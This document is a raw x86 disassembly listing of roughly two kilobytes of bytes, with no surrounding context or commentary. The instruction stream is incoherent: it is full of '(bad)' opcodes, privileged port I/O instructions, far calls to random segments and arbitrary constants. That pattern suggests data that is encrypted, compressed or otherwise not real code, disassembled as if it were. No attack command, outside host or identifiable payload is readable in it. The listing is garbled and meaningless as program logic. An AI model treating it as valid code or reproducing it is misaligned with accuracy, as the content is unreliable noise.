  4085f5:	in     eax,dx
  4085f6:	add    eax,0x1ed0cbf3
  4085fb:	mov    dl,0x1d
  4085fd:	mov    edx,0x905cc2e0
  408602:	xor    esi,DWORD PTR [ecx+0x3d]
  408605:	pop    ebx
  408606:	mov    edi,0x3d58d8ee
  40860b:	jb     0x40861a
  40860d:	clc    
  40860e:	into   
  40860f:	cwde   
  408610:	mov    dh,0x94
  408613:	dec    esi
  408614:	ins    BYTE PTR es:[edi],dx
  408615:	cs xchg edi,eax
  408617:	(bad)  
  408618:	es pop ebx
  40861a:	xor    al,0x97
  40861c:	enter  0x93b8,0x3f
  408620:	add    BYTE PTR [edi],0x3e
  408623:	and    edx,DWORD PTR [eax-0x45e6e019]
  408629:	lods   eax,DWORD PTR ds:[esi]
  40862a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40862d:	push   eax
  40862e:	rol    DWORD PTR [eax],cl
  408630:	leave  
  408631:	mov    eax,0xb36f563
  408636:	push   ebx
  408637:	in     eax,dx
  408638:	push   esp
  408639:	xchg   edx,eax
  40863a:	(bad)
  40863f:	pop    ecx
  408640:	adc    DWORD PTR [edx+ecx*4],edi
  408643:	lock lds ebx,FWORD PTR [esi]
  408646:	jp     0x408634
  408648:	mov    edi,0xe04a7e80
  40864d:	push   cs
  40864e:	retf   
  40864f:	xchg   bl,dh
  408651:	pop    esi
  408652:	aad    0xb3
  408654:	xchg   ecx,eax
  408655:	mov    ebx,0x5ac19b90
  40865a:	mov    cl,0xcc
  40865c:	sub    bl,ch
  40865e:	data16 mov cl,dl
  408661:	xchg   BYTE PTR [edi],ch
  408663:	xchg   di,ax
  408665:	add    ch,BYTE PTR [edi]
  408667:	imul   ebx,DWORD PTR ss:[esi],0x708249c
  40866e:	daa    
  40866f:	scas   eax,DWORD PTR es:[edi]
  408670:	jae    0x40865c
  408672:	xchg   ecx,eax
  408673:	jp     0x4086ad
  408675:	(bad)  
  408676:	cmp    ah,BYTE PTR [edi+0x7b]
  408679:	lock add bh,BYTE PTR [ebp-0x25]
  40867d:	dec    esp
  40867e:	(bad)  
  40867f:	mov    ds:0x1083e413,eax
  408684:	in     al,0xb
  408686:	and    DWORD PTR [ebx],esp
  408688:	add    eax,0xa12d7ffa
  40868d:	sbb    BYTE PTR [ebx],al
  40868f:	xchg   DWORD PTR [edi],ebx
  408691:	in     eax,dx
  408692:	cmp    DWORD PTR [esi],ebp
  408694:	pop    ebp
  408695:	cmc    
  408696:	dec    edx
  408697:	lock ret 0x1d91
  40869b:	jae    0x408688
  40869d:	not    ebx
  40869f:	inc    ecx
  4086a0:	xlat   BYTE PTR ds:[ebx]
  4086a1:	xlat   BYTE PTR ds:[ebx]
  4086a2:	xor    eax,0xf92c40be
  4086a7:	sub    al,0xcf
  4086a9:	sub    eax,0x360a2c8c
  4086ae:	dec    ebx
  4086af:	add    eax,0x8d1459a4
  4086b4:	aaa    
  4086b5:	xor    eax,0x14ca8c42
  4086ba:	inc    edx
  4086bb:	call   0x9e10:0x3b1181fa
  4086c2:	fwait
  4086c3:	dec    eax
  4086c4:	fucomp st(0)
  4086c6:	ret    
  4086c7:	cmp    BYTE PTR [edx-0x6199fef2],dh
  4086cd:	cmp    esp,DWORD PTR [edi+0x714edc55]
  4086d3:	cmp    ch,BYTE PTR [edi-0x1f]
  4086d6:	enter  0xfe98,0xa9
  4086da:	in     al,0x74
  4086dc:	fld    TBYTE PTR [ebx+0x3f56774]
  4086e2:	sub    DWORD PTR [edx],esi
  4086e4:	stos   BYTE PTR es:[edi],al
  4086e5:	xor    DWORD PTR [ebp+0x227093c3],edi
  4086eb:	mov    ebx,esi
  4086ed:	daa    
  4086ee:	xchg   edx,eax
  4086ef:	or     al,0x1d
  4086f1:	xchg   DWORD PTR [ecx-0x59],ebx
  4086f4:	rol    cl,cl
  4086f6:	sar    DWORD PTR [ebp+0x40],0xf9
  4086fa:	pushf  
  4086fb:	rcl    edi,1
  4086fd:	les    ebx,FWORD PTR [ecx+0x4b]
  408700:	stc    
  408701:	mov    ecx,0x21052401
  408706:	out    0xab,al
  408708:	jle    0x4086bf
  40870a:	es mov ch,0xe3
  40870d:	stc    
  40870e:	daa    
  40870f:	pop    esi
  408710:	sti    
  408711:	das    
  408712:	jne    0x40876c
  408714:	lahf   
  408715:	test   al,0x48
  408717:	jo     0x408750
  408719:	sbb    al,0x89
  40871b:	cmp    eax,0x3ab137f
  408720:	pushf  
  408721:	inc    ecx
  408722:	data16 fcomp st(0)
  408725:	push   esp
  408726:	rcl    DWORD PTR [eax-0x50],1
  408729:	sti    
  40872a:	ss pop esi
  40872c:	mov    cl,0xfc
  40872e:	inc    esp
  40872f:	xor    al,0x12
  408731:	rol    BYTE PTR [edi],1
  408733:	fldcw  WORD PTR [esi+0xf822975]
  408739:	sub    esi,DWORD PTR [esi+0x2c5476ea]
  40873f:	in     eax,0xfa
  408741:	cwde   
  408742:	cld    
  408743:	xchg   esi,eax
  408744:	inc    ebp
  408745:	adc    edi,DWORD PTR [edx]
  408747:	mov    dl,0x7b
  408749:	pushf  
  40874a:	pushf  
  40874b:	call   0xbca7:0xd69d58b8
  408752:	nop
  408753:	mov    ah,0xb5
  408755:	fcomp  QWORD PTR [eax]
  408757:	sub    ecx,DWORD PTR [ebx+0xd]
  40875a:	fcom   QWORD PTR [ebx+0x62]
  40875d:	jns    0x40871a
  40875f:	loop   0x408744
  408761:	mov    ds:0xfc2b62f3,eax
  408766:	mov    edi,0xc6596c04
  40876b:	fs call 0x3ad8:0x20f9923c
  408773:	mov    WORD PTR [edx-0x4ea9e149],?
  408779:	or     al,0x18
  40877b:	pop    eax
  40877c:	(bad)  
  40877d:	add    ebp,DWORD PTR [ebp+0xefe9d99]
  408783:	ja     0x40879e
  408785:	lods   al,BYTE PTR ds:[esi]
  408786:	jne    0x4087bd
  408788:	imul   edx,ebx,0x4d
  40878b:	sti    
  40878c:	loopne 0x408772
  40878e:	cmp    al,0x82
  408790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408791:	sti    
  408792:	jl     0x4087d6
  408794:	scas   al,BYTE PTR es:[edi]
  408795:	cmp    ch,BYTE PTR [eax+0x45]
  408798:	mov    dl,0x76
  40879a:	aam    0x1a
  40879c:	jge    0x40876f
  40879e:	sahf   
  40879f:	stos   DWORD PTR es:[edi],eax
  4087a0:	mov    esp,0xdec0b4c3
  4087a5:	and    DWORD PTR [edi+0xf4c5460],eax
  4087ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ac:	call   0x44eb:0xb070ce82
  4087b3:	add    DWORD PTR [eax],esp
  4087b5:	sbb    ebx,0x4b
  4087b8:	and    bh,BYTE PTR [eax-0x1c]
  4087bb:	add    eax,0xd57e681f
  4087c0:	mov    ecx,0xb655e80d
  4087c5:	add    BYTE PTR ds:0x941d1457,0x2b
  4087cc:	adc    esi,DWORD PTR [ebx+0x5d4bffa3]
  4087d2:	scas   al,BYTE PTR es:[edi]
  4087d3:	dec    esp
  4087d4:	adc    DWORD PTR [edi+0x78],ecx
  4087d7:	nop
  4087d8:	mov    eax,ds:0x2c99341
  4087dd:	ret    
  4087de:	inc    esi
  4087df:	mov    esp,0x1de56ed1
  4087e4:	inc    esi
  4087e5:	int    0x1d
  4087e7:	push   ds
  4087e8:	inc    esp
  4087e9:	out    dx,eax
  4087ea:	sub    ch,dh
  4087ec:	cmc    
  4087ed:	adc    eax,0x8408df25
  4087f2:	in     eax,dx
  4087f3:	pop    edx
  4087f4:	push   eax
  4087f5:	pushf  
  4087f6:	(bad)  [edx]
  4087f8:	pushf  
  4087f9:	cmp    esi,DWORD PTR [ecx]
  4087fb:	sahf   
  4087fc:	push   edx
  4087fd:	dec    edx
  4087fe:	push   DWORD PTR [ecx]
  408800:	and    ecx,DWORD PTR [ebx+eiz*4-0x43]
  408804:	jge    0x40883e
  408806:	gs mov fs,esp
  408809:	in     eax,dx
  40880a:	xchg   ecx,eax
  40880b:	dec    esp
  40880c:	cs daa 
  40880e:	cld    
  40880f:	lods   eax,DWORD PTR ds:[esi]
  408810:	and    al,BYTE PTR [ebp-0x63]
  408813:	mov    al,0x66
  408815:	push   cs
  408816:	jae    0x4087d0
  408818:	add    esp,DWORD PTR [edi]
  40881a:	rol    BYTE PTR [eax],0x1c
  40881d:	and    eax,0x56e45c
  408822:	mov    ds:0x740d6025,al
  408827:	aam    0x20
  408829:	sbb    eax,0x35e3af4
  40882e:	dec    eax
  40882f:	mov    DWORD PTR [edi+0x4a7d9577],esi
  408835:	fst    QWORD PTR [ecx+0x6b]
  408838:	jnp    0x408827
  40883a:	mov    dl,BYTE PTR [edx-0x2cf17165]
  408840:	cmp    DWORD PTR [eax-0xa],ebp
  408843:	ins    DWORD PTR es:[edi],dx
  408844:	push   0x7403cc04
  408849:	sub    DWORD PTR [ebp+edi*2-0x75],0x45
  40884e:	call   0x413258
  408853:	add    BYTE PTR [eax-0x17],dl
  408856:	push   es
  408857:	add    eax,0xccd30000
  40885c:	ror    eax,cl
  40885e:	ror    edi,cl
  408860:	rcl    ebx,cl
  408862:	retf   
  408863:	rol    ecx,1
  408865:	into   
  408866:	lahf   
  408867:	adc    al,0xfd
  408869:	aas    
  40886a:	fsubp  st(7),st
  40886c:	js     0x4088e6
  40886e:	push   0x7c
  408870:	js     0x4088ea
  408872:	iret   
  408873:	mov    edi,0x6d283a3f
  408878:	mov    al,0xc8
  40887a:	dec    esi
  40887b:	mov    esp,0xb0e51be0
  408880:	inc    sp
  408882:	test   DWORD PTR [esi-0x4419cfd7],edx
  408888:	sahf   
  408889:	jg     0x4088aa
  40888b:	push   cs
  40888c:	mov    bl,0x8d
  40888e:	popa   
  40888f:	je     0x408852
  408891:	adc    BYTE PTR es:[ecx+0x42],0x9b
  408896:	out    dx,eax
  408897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408898:	fadd   DWORD PTR [eax]
  40889a:	das    
  40889b:	icebp  
  40889c:	call   0xfa80:0x1b43e4f1
  4088a3:	es retf 
  4088a5:	sbb    al,BYTE PTR [ebx+edx*4]
  4088a8:	mov    bl,0x63
  4088aa:	ja     0x4088cd
  4088ac:	jno    0x4088b5
  4088ae:	or     BYTE PTR [esi-0x5def9a11],dh
  4088b4:	frndint 
  4088b6:	imul   eax,DWORD PTR [eax],0x1e
  4088b9:	push   ebp
  4088ba:	nop
  4088bb:	gs xchg edi,eax
  4088bd:	out    0x50,eax
  4088bf:	pop    edi
  4088c0:	int3   
  4088c1:	out    0x7a,al
  4088c3:	and    dh,ch
  4088c5:	mov    esi,DWORD PTR [ebp-0x4e]
  4088c8:	xchg   esp,eax
  4088c9:	iret   
  4088ca:	push   0xfffffff2
  4088cc:	mov    ebp,0xae991ca4
  4088d1:	xchg   ecx,eax
  4088d2:	fidivr WORD PTR [edx+edx*4+0x49e33f34]
  4088d9:	and    dh,ch
  4088db:	xor    BYTE PTR [edi+ecx*2],0x56
  4088df:	sbb    al,0x83
  4088e1:	mov    WORD PTR [edx-0x1b],es
  4088e4:	xchg   esi,eax
  4088e5:	sub    ah,BYTE PTR [eax-0x8]
  4088e8:	sub    DWORD PTR [ecx],ecx
  4088ea:	or     DWORD PTR [ebp-0x3d],edi
  4088ed:	loopne 0x4088d0
  4088ef:	sbb    dh,cl
  4088f1:	leave  
  4088f2:	mov    eax,ds:0xcc67540f
  4088f7:	inc    esi
  4088f8:	fwait
  4088f9:	xor    BYTE PTR [edx],cl
  4088fb:	outs   dx,DWORD PTR ds:[esi]
  4088fc:	sub    al,BYTE PTR [ecx]
  4088fe:	pop    ecx
  4088ff:	(bad)  
  408900:	cdq    
  408901:	jb     0x4088b2
  408903:	es mov dl,0xe2
  408906:	sbb    al,BYTE PTR [edi]
  408908:	jmp    0x40888e
  40890a:	add    BYTE PTR [edi+0x9],dl
  40890d:	iret   
  40890e:	push   ebp
  40890f:	leave  
  408910:	test   BYTE PTR [edx+0x1b39dd56],bh
  408916:	in     eax,0xf9
  408918:	jg     0x408942
  40891a:	(bad)  
  40891d:	dec    ecx
  40891e:	mov    ds:0x549c839a,eax
  408923:	jae    0x408969
  408925:	mov    ds:0x10810bfd,al
  40892a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40892b:	dec    ebx
  40892c:	das    
  40892d:	shr    BYTE PTR [ebx],0xda
  408930:	adc    ebp,edx
  408932:	cmp    eax,0x946067d9
  408937:	jmp    0x1f5eb9f0
  40893c:	push   eax
  40893d:	mov    bh,BYTE PTR [eax]
  40893f:	mov    ebp,DWORD PTR [ebp-0x5f9df85a]
  408945:	push   0xa8cef0d6
  40894a:	add    al,0x0
  40894c:	jbe    0x4089bf
  40894e:	jno    0x408947
  408950:	or     DWORD PTR [ebp-0x64776cbd],0xd3df7f29
  40895a:	cli    
  40895b:	loopne 0x408941
  40895d:	jmp    0x3db2:0x32b6e59d
  408964:	and    eax,0xfbbb6ace
  408969:	sub    al,0xee
  40896b:	int3   
  40896c:	mov    eax,ds:0xc04b8f0
  408971:	mov    ah,0x80
  408973:	xor    al,BYTE PTR [edx-0x33]
  408976:	fs mov edx,0x95e37e96
  40897c:	xor    dh,BYTE PTR [ebx]
  40897e:	jno    0x408901
  408980:	sub    dl,BYTE PTR [ebp+0x15ea81e2]
  408986:	inc    eax
  408987:	xor    DWORD PTR [edi-0x6d],ecx
  40898a:	inc    ebp
  40898b:	or     cl,BYTE PTR [edx]
  40898d:	fcmovbe st,st(4)
  40898f:	ds mov ecx,0xe3699266
  408995:	jmp    DWORD PTR [eax-0x21ee8fa8]
  40899b:	cld    
  40899c:	(bad)  
  40899d:	loop   0x40899b
  40899f:	imul   eax,ebx,0xd9bdad62
  4089a5:	ins    BYTE PTR es:[edi],dx
  4089a6:	xor    ebp,DWORD PTR [ebx]
  4089a8:	xchg   esi,eax
  4089a9:	jbe    0x4089e4
  4089ab:	aam    0x8c
  4089ad:	pop    ds
  4089ae:	ret    0xb9a2
  4089b1:	sbb    ah,cl
  4089b3:	and    ah,al
  4089b5:	in     eax,0xc0
  4089b7:	add    al,0x5e
  4089b9:	data16 jns 0x408952
  4089bc:	icebp  
  4089bd:	lods   al,BYTE PTR ds:[esi]
  4089be:	mov    eax,0x617c4ad
  4089c3:	push   ebp
  4089c4:	lods   al,BYTE PTR ds:[esi]
  4089c5:	mov    ebp,0x5886e5cf
  4089ca:	sub    ecx,DWORD PTR [esi+0x66]
  4089cd:	test   eax,0x7d0e247
  4089d2:	inc    ebx
  4089d3:	push   ds
  4089d4:	sbb    al,BYTE PTR [ecx+ecx*8+0x74a1e771]
  4089db:	inc    ebp
  4089dc:	popa   
  4089dd:	fidivr WORD PTR es:[ebp-0xf836ef8]
  4089e4:	aas    
  4089e5:	fnstcw WORD PTR [ebx]
  4089e7:	stos   BYTE PTR es:[edi],al
  4089e8:	sar    ebx,1
  4089ea:	mov    DWORD PTR [ebx],esp
  4089ec:	fcomp  DWORD PTR [edi]
  4089ee:	scas   al,BYTE PTR es:[edi]
  4089ef:	sub    dh,BYTE PTR [ebp+0x7ddf4042]
  4089f5:	clc    
  4089f6:	imul   ebx,DWORD PTR [ebx],0x97fe5d51
  4089fc:	pop    eax
  4089fd:	jnp    0x4089bd
  4089ff:	test   BYTE PTR [ebp-0x9],0x1e
  408a03:	adc    ecx,DWORD PTR [esi-0x2f7d473e]
  408a09:	mov    cl,0xd4
  408a0b:	push   0x443db1b1
  408a10:	(bad)  
  408a12:	stos   WORD PTR es:[edi],ax
  408a14:	inc    ebx
  408a15:	lds    edx,FWORD PTR [ecx+0x2f6e31b5]
  408a1b:	pusha  
  408a1c:	into   
  408a1d:	cli    
  408a1e:	jmp    0x408a2d
  408a20:	ds pop es
  408a22:	xor    al,0x1b
  408a24:	daa    
  408a25:	push   ebx
  408a26:	ret    
  408a27:	xchg   DWORD PTR [esi-0x79],edi
  408a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a2b:	push   ecx
  408a2c:	sub    eax,0xa4dcb57d
  408a31:	into   
  408a32:	iret   
  408a33:	cmp    dl,BYTE PTR [edi+0x73a02a6b]
  408a39:	xchg   ecx,eax
  408a3a:	mov    WORD PTR [eax],ss
  408a3c:	aam    0x18
  408a3e:	test   eax,0xe8c88386
  408a43:	add    dh,al
  408a45:	pop    esp
  408a46:	mov    dl,0x96
  408a48:	(bad)  
  408a49:	push   ss
  408a4a:	push   ebx
  408a4b:	dec    edx
  408a4c:	loop   0x408a35
  408a4e:	adc    dl,dh
  408a50:	xor    bh,BYTE PTR ds:0x5302f4bd
  408a56:	arpl   WORD PTR [ebx-0x26],cx
  408a59:	cmp    ah,BYTE PTR [ebx-0x3d]
  408a5c:	fsub   QWORD PTR ds:0xa3c9d789
  408a62:	sti    
  408a63:	jg     0x408a7b
  408a65:	sti    
  408a66:	push   es
  408a67:	repz cli 
  408a69:	sbb    al,0xfe
  408a6b:	or     BYTE PTR [ecx+eax*1-0x30c773ca],ch
  408a72:	fisttp QWORD PTR [eax]
  408a74:	inc    ebp
  408a75:	jl     0x408a47
  408a77:	stos   DWORD PTR es:[edi],eax
  408a78:	and    ecx,DWORD PTR [eax+esi*2+0x6a3eb207]
  408a7f:	ret    
  408a80:	xchg   edx,eax
  408a81:	add    edi,DWORD PTR [esi-0x2e]
  408a84:	ja     0x408a79
  408a86:	pop    esi
  408a87:	int    0x4
  408a89:	and    al,0xf5
  408a8b:	push   ebp
  408a8c:	jbe    0x408ae6
  408a8e:	dec    ebx
  408a8f:	sbb    DWORD PTR [ecx+0x2d3a02e7],ebp
  408a95:	ret    0xb7df
  408a98:	mov    esi,0x54b75488
  408a9d:	js     0x408a44
  408a9f:	adc    eax,0xdb9f0b8e
  408aa4:	add    dh,bh
  408aa6:	or     BYTE PTR [eax-0x39c55ca2],cl
  408aac:	push   esp
  408aad:	and    BYTE PTR [ebp-0x76],ah
  408ab0:	test   DWORD PTR [edi-0x3],edx
  408ab3:	pushf  
  408ab4:	mov    ecx,0xbe4131c2
  408ab9:	imul   DWORD PTR [edi-0x7bb16878]
  408abf:	idiv   DWORD PTR [eax+0x1]
  408ac2:	pop    eax
  408ac3:	xlat   BYTE PTR ds:[ebx]
  408ac4:	dec    ebp
  408ac5:	repz repnz pushf 
  408ac8:	and    eax,DWORD PTR [ecx+0x37]
  408acb:	push   esi
  408acc:	push   eax
  408acd:	sbb    ch,BYTE PTR [esi-0x38a419af]
  408ad3:	cmc    
  408ad4:	adc    dl,BYTE PTR [ecx-0x70]
  408ad7:	push   esp
  408ad8:	scas   eax,DWORD PTR es:[edi]
  408ad9:	jnp    0x408a70
  408adb:	inc    edi
  408adc:	outs   dx,DWORD PTR ds:[esi]
  408add:	ds pop esp
  408adf:	xchg   ebp,eax
  408ae0:	cld    
  408ae1:	pop    esp
  408ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ae3:	outs   dx,DWORD PTR ds:[esi]
  408ae4:	cmp    al,al
  408ae6:	mov    eax,ds:0x3954fce7
  408aeb:	pop    ecx
  408aec:	lahf   
  408aed:	mov    ecx,?
  408aef:	or     edi,DWORD PTR [ecx+0x138c0112]
  408af5:	xchg   ecx,eax
  408af6:	dec    ebx
  408af7:	push   edx
  408af8:	jg     0x408b46
  408afa:	inc    ebp
  408afb:	mov    dl,0x9d
  408afd:	mov    BYTE PTR [esi+ecx*2-0x2],dh
  408b01:	push   eax
  408b02:	sbb    DWORD PTR [edx],eax
  408b04:	jne    0x408b08
  408b06:	sub    DWORD PTR [ebx+0x17c4cf38],edi
  408b0c:	push   0xe0ecef76
  408b11:	jae    0x408b14
  408b13:	enter  0x991,0x8
  408b17:	jl     0x408aa9
  408b19:	sub    al,0x27
  408b1b:	xchg   BYTE PTR [ebp-0x6c9f11e9],cl
  408b21:	mov    ecx,0x238e07d4
  408b26:	sub    BYTE PTR [ecx],ah
  408b28:	scas   al,BYTE PTR es:[edi]
  408b29:	pop    ds
  408b2a:	add    BYTE PTR [eax+0x1b],dl
  408b2d:	ror    BYTE PTR [ebp-0x477a16f9],0x72
  408b34:	xor    ecx,DWORD PTR [ebx+0x12ec8c5d]
  408b3a:	mov    BYTE PTR [edi+0x78],0xad
  408b3e:	es pop esp
  408b40:	inc    esi
  408b41:	scas   al,BYTE PTR es:[edi]
  408b42:	cmp    BYTE PTR [esi-0x1a],bl
  408b45:	cmp    eax,0x6252f290
  408b4a:	nop
  408b4b:	jns    0x408ade
  408b4d:	dec    eax
  408b4e:	xor    DWORD PTR [eax-0x42ca8b56],edi
  408b54:	sbb    DWORD PTR [ecx],esi
  408b56:	sbb    eax,0x6b69dc7b
  408b5b:	xchg   ebx,eax
  408b5c:	push   eax
  408b5d:	pusha  
  408b5e:	loope  0x408b10
  408b60:	and    DWORD PTR [ecx+0x40],0x31
  408b64:	mov    ecx,0xcc8e7b45
  408b69:	sub    edx,DWORD PTR [eax]
  408b6b:	jb     0x408be2
  408b6d:	or     WORD PTR [ebx],bx
  408b70:	ret    0xe117
  408b73:	scas   eax,DWORD PTR es:[edi]
  408b74:	or     bl,BYTE PTR ds:0xbd1d2c51
  408b7a:	dec    esp
  408b7b:	sub    BYTE PTR [edx-0x69],0xf5
  408b7f:	fldcw  WORD PTR [esi+0x2c]
  408b82:	cmc    
  408b83:	xor    eax,0xd71105d5
  408b88:	in     al,dx
  408b89:	rcr    dh,1
  408b8b:	mov    ebx,0x27309d1a
  408b90:	add    eax,ecx
  408b92:	push   edi
  408b93:	jne    0x408b1b
  408b95:	lods   al,BYTE PTR ds:[esi]
  408b96:	xor    esi,DWORD PTR [eax]
  408b98:	popa   
  408b99:	cld    
  408b9a:	push   edx
  408b9b:	fstp   DWORD PTR [edx]
  408b9d:	inc    edi
  408b9e:	pop    edi
  408b9f:	lods   eax,DWORD PTR ds:[esi]
  408ba0:	push   0xffffff8e
  408ba2:	mov    al,ds:0x2f05d552
  408ba7:	(bad)  
  408ba8:	pop    esp
  408ba9:	jo     0x408b8e
  408bab:	mov    eax,0xa3a358bb
  408bb0:	test   BYTE PTR cs:[ebp+0x1ddc1ca9],ch
  408bb7:	call   0x8e61:0xc1cd3a0d
  408bbe:	or     eax,0x56a16260
  408bc3:	pop    esi
  408bc4:	dec    edx
  408bc5:	push   esi
  408bc6:	addr16 test eax,0x27daf1f
  408bcc:	mov    BYTE PTR [esi],bl
  408bce:	mov    ebx,0xc86d3ec4
  408bd3:	(bad)  
  408bd4:	jecxz  0x408b68
  408bd6:	mov    eax,0xa2758f22
  408bdb:	adc    BYTE PTR [ecx+0x1186a725],al
  408be1:	(bad)  
  408be3:	xlat   BYTE PTR ds:[ebx]
  408be4:	pusha  
  408be5:	scas   al,BYTE PTR es:[edi]
  408be6:	sbb    DWORD PTR [ebp-0x46],0xf735cea3
  408bed:	sbb    BYTE PTR [ebp+0x1395cbb4],dh
  408bf3:	inc    eax
  408bf4:	ds jg  0x408b7a
  408bf7:	mov    edi,0xc1b447cc
  408bfc:	stc    
  408bfd:	jo     0x408bf5
  408bff:	in     eax,dx
  408c00:	jb     0x408be1
  408c02:	push   eax
  408c03:	sbb    eax,0x9d62d408
  408c08:	jmp    0x90ff:0xce84c99b
  408c0f:	mov    eax,0xb92f37e2
  408c14:	push   esp
  408c15:	sbb    BYTE PTR [edi+0x20],dl
  408c18:	arpl   WORD PTR [edx+0x15],cx
  408c1b:	push   cs
  408c1c:	into   
  408c1d:	jecxz  0x408c3e
  408c1f:	ret    0xa151
  408c22:	adc    dh,dl
  408c24:	fwait
  408c25:	jl     0x408c87
  408c27:	xchg   edx,eax
  408c28:	retf   
  408c29:	retf   0x2f50
  408c2c:	cmp    eax,0x811a611a
  408c31:	jmp    0x408cac
  408c33:	mov    WORD PTR [edi+0x6a],ss
  408c36:	push   ss
  408c37:	jmp    0xf49:0x476736a3
  408c3e:	xor    al,0xf
  408c40:	mov    al,ds:0x9a840a83
  408c45:	in     al,dx
  408c46:	iret   
  408c47:	and    BYTE PTR [ecx+0x44c592cd],dl
  408c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4e:	pop    ds
  408c4f:	aam    0x74
  408c51:	pop    esi
  408c52:	dec    esi
  408c53:	inc    esi
  408c54:	inc    esi
  408c55:	ds and edi,ebp
  408c58:	dec    esi
  408c59:	clc    
  408c5a:	jns    0x408cce
  408c5c:	push   ebx
  408c5d:	imul   ebp,DWORD PTR [edi-0x7],0x3e
  408c61:	retf   
  408c62:	es xor al,0xa0
  408c65:	xor    eax,0xf00c6cef
  408c6a:	pop    ebp
  408c6b:	sti    
  408c6c:	(bad)  [eax+0x5cc004a0]
  408c72:	cmc    
  408c73:	mov    edx,0xa823f7df
  408c78:	rcl    BYTE PTR ds:0xfd7bc17b,cl
  408c7e:	and    BYTE PTR [ebp-0x1b],0x98
  408c82:	lods   al,BYTE PTR ds:[esi]
  408c83:	or     bh,dh
  408c85:	or     ah,BYTE PTR [ecx+0x50065f16]
  408c8b:	cmp    al,0x4d
  408c8d:	je     0x408cb9
  408c8f:	sahf   
  408c90:	jl     0x408cc2
  408c92:	dec    esp
  408c93:	and    al,0xd4
  408c95:	lds    edi,FWORD PTR [ebx-0x2e]
  408c98:	mov    bh,0x4e
  408c9a:	or     eax,0x6ec9a1f1
  408c9f:	out    0x19,al
  408ca1:	xor    al,0xed
  408ca3:	test   al,0xba
  408ca5:	clc    
  408ca6:	cwde   
  408ca7:	aas    
  408ca8:	mov    dh,0x60
  408caa:	clc    
  408cab:	shr    BYTE PTR [ebx],cl
  408cad:	inc    edi
  408cae:	push   esp
  408caf:	and    DWORD PTR [ebx+0x60],eax
  408cb2:	out    0xa6,eax
  408cb4:	sub    dl,BYTE PTR [ecx]
  408cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cb7:	xchg   edx,eax
  408cb8:	cmp    DWORD PTR [ebx*8+0x5caa4b96],ecx
  408cbf:	add    BYTE PTR [esi],dh
  408cc1:	and    ch,BYTE PTR [ebx]
  408cc3:	adc    ah,BYTE PTR [eax+0x34]
  408cc6:	xchg   BYTE PTR [ebx-0x5c00f89c],ch
  408ccc:	jne    0x408d3a
  408cce:	jmp    0x408d30
  408cd0:	jmp    0x8c6:0x505cc01a
  408cd7:	adc    al,BYTE PTR [edi]
  408cd9:	test   DWORD PTR [edx],edx
  408cdb:	bnd jne 0x408c79
  408cde:	test   al,0x81
  408ce0:	dec    ecx
  408ce1:	sub    al,dl
  408ce3:	es test al,0x3e
  408ce6:	aad    0xc1
  408ce8:	xchg   esi,eax
  408ce9:	add    al,0xb7
  408ceb:	leave  
  408cec:	push   cs
  408ced:	mov    ebp,0xce291353
  408cf2:	mov    ebx,0x1dfda7a2
  408cf7:	adc    ah,BYTE PTR [ebp-0x4b60a413]
  408cfd:	mov    esi,0xdc7d89c6
  408d02:	jbe    0x408cd5
  408d04:	pop    esp
  408d05:	ja     0x408d3e
  408d07:	xchg   BYTE PTR [esi+0x75],al
  408d0a:	sbb    al,0xc
  408d0c:	push   esp
  408d0d:	nop
  408d0e:	push   ecx
  408d0f:	rcr    bl,0x13
  408d12:	jp     0x408ced
  408d14:	repnz sub ah,ah
  408d17:	and    ebp,DWORD PTR [ecx+0x67534c9]
  408d1d:	cs or  edx,edi
  408d20:	dec    edi
  408d21:	or     DWORD PTR [edi+0x2352f47],esi
  408d27:	sub    al,0x97
  408d29:	pushf  
  408d2a:	or     BYTE PTR [ebp+0x43],bh
  408d2d:	lea    esp,[edi]
  408d2f:	mov    edi,0x865de8c6
  408d34:	or     al,0x95
  408d36:	pop    esi
  408d37:	cli    
  408d38:	cs js  0x408d82
  408d3b:	call   0x4a00:0x19ed9a21
  408d42:	add    bl,dh
  408d44:	dec    ebp
  408d45:	cs call 0x9f06419c
  408d4b:	lds    esi,FWORD PTR [eax-0x18]
  408d4e:	push   0xe4c2a0ba
  408d53:	out    dx,al
  408d54:	mov    ebx,0x48be2915
  408d59:	repnz repz lds eax,FWORD PTR [ecx-0x74e78d27]
  408d61:	inc    ebp
  408d62:	call   0x1d90df2
  408d67:	add    BYTE PTR [eax],al
  408d69:	push   DWORD PTR [eax]
  408d6b:	jmp    0x409276
  408d70:	ret    0x3ccb
  408d73:	ret    
  408d74:	leave  
  408d75:	retf   
  408d76:	ror    ecx,0x4f
  408d79:	(bad)  
  408d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d7b:	(bad)  
  408d7c:	cmc    
  408d7d:	pop    esi
  408d7e:	mov    DWORD PTR ds:0x7878f2c8,ecx
  408d84:	push   0x7c
  408d86:	js     0x408e00
  408d88:	loop   0x408d0f
  408d8a:	shl    BYTE PTR [ebx-0x5c],1
  408d8d:	adc    DWORD PTR [edx],esp
  408d8f:	stc    
  408d90:	(bad)  
  408d92:	(bad)  
  408d93:	leave  
  408d94:	jo     0x408dfd
  408d96:	jno    0x408d1d
  408d98:	aas    
  408d99:	into   
  408d9a:	test   al,ch
  408d9c:	mov    esp,0x83854b26
  408da1:	ror    edx,cl
  408da3:	sub    ebp,edi
  408da5:	stos   BYTE PTR es:[edi],al
  408da6:	dec    ebx
  408da7:	jmp    0x408d3c
  408da9:	or     DWORD PTR [edi-0x4b],ebx
  408dac:	ror    ebp,1
  408dae:	nop
  408daf:	mov    bl,0x74
  408db1:	jb     0x408ddf
  408db3:	lahf   
  408db4:	in     eax,0x97
  408db6:	nop
  408db7:	add    edi,DWORD PTR [ebx]
  408db9:	ja     0x408d77
  408dbb:	mov    ah,BYTE PTR [edi+edi*4]
  408dbe:	aas    
  408dbf:	ins    DWORD PTR es:[edi],dx
  408dc0:	jae    0x408d83
  408dc2:	cmp    ebp,ebp
